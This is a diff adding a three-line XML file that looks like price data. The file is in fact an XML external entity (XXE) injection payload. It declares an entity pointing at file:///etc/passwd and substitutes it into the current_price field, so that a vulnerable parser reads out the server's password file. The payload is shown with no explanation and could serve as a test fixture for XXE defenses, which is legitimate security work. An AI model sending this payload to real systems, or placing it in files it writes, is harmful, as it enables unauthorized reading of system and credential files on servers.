@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY fetch SYSTEM "file:///etc/passwd">]>
+<price><current_price>&fetch;</current_price></price>
